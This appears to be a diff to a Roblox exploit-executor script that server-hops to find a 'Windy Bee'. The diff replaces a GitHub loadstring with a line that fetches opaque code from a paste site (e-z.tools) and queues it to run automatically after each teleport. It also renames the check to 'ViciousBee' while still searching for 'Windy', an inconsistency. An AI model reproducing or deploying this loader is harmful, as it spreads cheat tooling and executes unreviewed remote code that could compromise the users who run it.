@@ -2,25 +2,20 @@ repeat task.wait() until game:IsLoaded()
 print("Loaded")
 
 local httpService = game:GetService("HttpService")
+
 local placeID = game.PlaceId
 local teleportService = game:GetService("TeleportService")
 local Found = false
 
-local function checkForWindyBee()
-    for _, child in ipairs(game:GetService("Workspace").Monsters:GetChildren()) do
-        if string.find(child.Name, "Windy Bee") then
+local function checkForViciousBee()
+    for _, child in ipairs(game:GetService("Workspace").NPCBees:GetChildren()) do
+        if string.find(child.Name, "Windy") then
             Found = true
-            game.StarterGui:SetCore("SendNotification", {
-                Title = "Windy Bee Hopper",
-                Text = "Windy Bee Found!",
-                Duration = 30
-            })
             return true
         end
     end
     return false
 end
-
 local function sendNotif()
     game.StarterGui:SetCore("SendNotification", {
         Title = "Windy Bee Hopper",
@@ -46,11 +41,7 @@ local function hop()
                     sendNotif()
                     return true
                 end
-
-                queue_on_teleport([[
-                    loadstring(game:HttpGet("https://raw.githubusercontent.com/luke1for1/zenith/refs/heads/main/whop.lua"))()
-                ]])
-
+                queue_on_teleport(game:HttpGet("https://e-z.tools/p/raw/qa6az4va4w"))
                 teleportService:TeleportToPlaceInstance(placeID, serverID, game.Players.LocalPlayer)
             end)
             if hopSuccess then
@@ -60,14 +51,13 @@ local function hop()
     end
 end
 
-game:GetService("Workspace").Monsters.ChildAdded:Connect(function(child)
-    if string.find(child.Name, "Windy Bee") then
+game:GetService("Workspace").NPCBees.ChildAdded:Connect(function(child)
+    if string.find(child.Name, "Windy") then
         Found = true
-        sendNotif()
     end
 end)
 
-if not checkForWindyBee() then
+if not checkForViciousBee() then
     hop()
 else
     sendNotif()
